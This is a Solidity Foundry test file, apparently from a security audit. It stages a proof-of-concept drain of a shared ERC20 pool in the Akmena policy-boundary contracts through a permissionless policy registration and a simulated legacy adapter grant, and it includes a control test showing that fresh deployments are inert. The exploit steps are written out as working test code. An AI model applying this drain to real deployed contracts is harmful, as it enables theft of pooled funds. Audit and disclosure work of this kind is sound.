// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/core/AkmenaCore.sol";
import "../src/authorization/AkmenaPolicyBoundary.sol";
import "../src/authorization/AkmenaExecutionAuthorization.sol";

/// Minimal mock ERC20 used to stage the attack.
contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 al = allowance[from][msg.sender];
        require(al >= amt, "MockERC20: insufficient allowance");
        if (al != type(uint256).max) {
            allowance[from][msg.sender] = al - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// PROPOSED PoC — V-0 cross-operator shared-custody drain.
///
/// STATUS: STAGED ONLY. NOT EXECUTED. Awaiting owner authorization (A-2).
/// RUN (only after explicit approval, from the repo root at 00428402):
///     forge test --match-path "scratch-poc/V0_OperatorDrain.t.sol" -vvv
///
/// THREAT MODEL (faithful, on-chain-possible steps only):
///   - Boundary holds a single commingled ERC20 balance (victim-funded).
///   - `setAgentAssetPolicy` is permissionless; policy is namespaced by
///     `msg.sender`, so the attacker self-registers a maximal policy under
///     their own operator namespace.
///   - `intent.agent` must equal the caller, and the attacker IS the caller,
///     so the attacker's own valid signature satisfies authorization.
///   - No deposit attribution, operator registry, or funding-owner check
///     exists anywhere in the authorization path.
///
/// V-9 PRECONDITION (honest modeling):
///   On current HEAD (00428402), the ONLY on-chain way for an ERC20 intent to
///   move the boundary's tokens is `intent.target == intent.asset` (the token
///   contract executing `transfer` with msg.sender == boundary). Non-token
///   adapters cannot pull: no approve/safeApprove/safeIncreaseAllowance path
///   exists anywhere in src/, so no pull allowance can ever be granted.
///   New self-adapter grants revert (InvalidAdapter), so the PoC simulates a
///   LEGACY grant — a boundary deployed before 00428402 whose storage still
///   carries economicAdapters[token][token] == true — via vm.store. This is
///   exactly the V-9 legacy-storage hazard, and the vm.store line below is the
///   ONLY non-on-chain step in the PoC.
///
/// N-7 CONTROL (test_Control_FreshDeploymentIsInert):
///   Without the legacy grant, the same attack reverts
///   EconomicAdapterNotAllowed and nothing moves — proving that on a truly
///   fresh 00428402 deployment the boundary is ERC20-INERT: tokens can enter
///   via direct transfer but cannot leave through execution. Option B
///   (boundary-initiated push) is therefore functionally required for ERC20
///   execution, not merely a security hardening.
///
/// EXPECTED RESULTS (if the vulnerability is real):
///   test_V0_OperatorDrainsSharedPool  -> attacker ends with 1000e18,
///                                        boundary ends with 0, spend recorded
///                                        against the ATTACKER's own policy.
///   test_Control_FreshDeploymentIsInert -> reverts, balances unchanged.
contract V0_OperatorDrainTest is Test {
    uint256 internal constant ATTACKER_KEY = 0xB0B;
    address internal attacker;
    address internal victim = address(0x1234);

    AkmenaCore internal core;
    AkmenaPolicyBoundary internal boundary;
    AkmenaExecutionAuthorization internal auth;
    MockERC20 internal token;

    uint256 internal nonce = 1;

    function setUp() public {
        attacker = vm.addr(ATTACKER_KEY);

        core = new AkmenaCore();
        boundary = new AkmenaPolicyBoundary(address(core));
        auth = boundary.executionAuthorization();

        token = new MockERC20();

        // Victim funds the shared boundary pool. No attribution is recorded.
        token.mint(victim, 1000e18);
        vm.prank(victim);
        token.transfer(address(boundary), 1000e18);
    }

    /// economicAdapters is declared at storage slot 2 in AkmenaPolicyBoundary.
    function _allowlistSlot(address asset, address adpt) internal pure returns (bytes32) {
        bytes32 inner = keccak256(abi.encode(asset, uint256(2)));
        return keccak256(abi.encode(adpt, inner));
    }

    /// Simulate the V-9 legacy state: a pre-00428402 self-adapter grant still
    /// present in boundary storage. This is the ONLY non-on-chain step.
    function _legacySelfAdapterGrant() internal {
        vm.store(address(boundary), _allowlistSlot(address(token), address(token)), bytes32(uint256(1)));
        assertTrue(
            boundary.economicAdapters(address(token), address(token)), "legacy grant simulation failed"
        );
    }

    function _sign(AkmenaExecutionAuthorization.ExecutionIntent memory intent, uint256 key)
        internal
        view
        returns (bytes memory)
    {
        bytes32 digest = auth.hashIntent(intent);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(key, digest);
        return abi.encodePacked(r, s, v);
    }

    function _drainIntent(uint256 amount, uint256 n)
        internal
        view
        returns (AkmenaExecutionAuthorization.ExecutionIntent memory, bytes memory)
    {
        bytes memory payload = abi.encodeCall(MockERC20.transfer, (attacker, amount));
        AkmenaExecutionAuthorization.ExecutionIntent memory intent = AkmenaExecutionAuthorization.ExecutionIntent({
            operator: attacker,
            agent: attacker,
            target: address(token),
            selector: MockERC20.transfer.selector,
            calldataHash: keccak256(payload),
            asset: address(token),
            amount: amount,
            value: 0,
            proofModuleKey: bytes32(0),
            proofId: 0,
            nonce: n,
            validAfter: 0,
            // forge-lint: disable-next-line(block-timestamp)
            deadline: block.timestamp + 7 days
        });
        return (intent, payload);
    }

    /// V-0: the attacker self-registers a maximal policy under their own
    /// operator namespace, signs as their own agent, and drains the pooled
    /// ERC20 through the legacy self-adapter grant.
    function test_V0_OperatorDrainsSharedPool() public {
        _legacySelfAdapterGrant();

        // Attacker self-service: maximal policy under the attacker's own
        // operator namespace. No victim interaction, no approval.
        vm.prank(attacker);
        boundary.setAgentAssetPolicy(attacker, address(token), type(uint256).max, type(uint256).max, false);

        (AkmenaExecutionAuthorization.ExecutionIntent memory intent, bytes memory payload) =
            _drainIntent(1000e18, nonce++);
        bytes memory sig = _sign(intent, ATTACKER_KEY);

        vm.prank(attacker);
        boundary.executeAuthorizedAgentCall(intent, payload, sig);

        assertEq(token.balanceOf(attacker), 1000e18, "V-0 drain failed: attacker did not receive pool");
        assertEq(token.balanceOf(address(boundary)), 0, "V-0 drain failed: boundary not emptied");

        // The accounting "worked" — it just attributed the spend to the
        // attacker's own self-registered policy.
        (,, uint256 totalSpentToday,,) = boundary.agentAssetPolicies(attacker, attacker, address(token));
        assertEq(totalSpentToday, 1000e18, "spend not recorded against attacker policy");
    }

    /// N-7 control: on a fresh 00428402 deployment (no legacy grant), the
    /// identical attack reverts EconomicAdapterNotAllowed and nothing moves.
    /// The boundary is ERC20-inert: tokens can enter but cannot leave.
    function test_Control_FreshDeploymentIsInert() public {
        // No legacy grant: economicAdapters[token][token] == false.

        vm.prank(attacker);
        boundary.setAgentAssetPolicy(attacker, address(token), type(uint256).max, type(uint256).max, false);

        (AkmenaExecutionAuthorization.ExecutionIntent memory intent, bytes memory payload) =
            _drainIntent(1000e18, nonce++);
        bytes memory sig = _sign(intent, ATTACKER_KEY);

        vm.prank(attacker);
        vm.expectRevert(AkmenaPolicyBoundary.EconomicAdapterNotAllowed.selector);
        boundary.executeAuthorizedAgentCall(intent, payload, sig);

        assertEq(token.balanceOf(address(boundary)), 1000e18, "boundary balance changed on fresh deployment");
        assertEq(token.balanceOf(attacker), 0, "attacker received tokens on fresh deployment");
    }
}
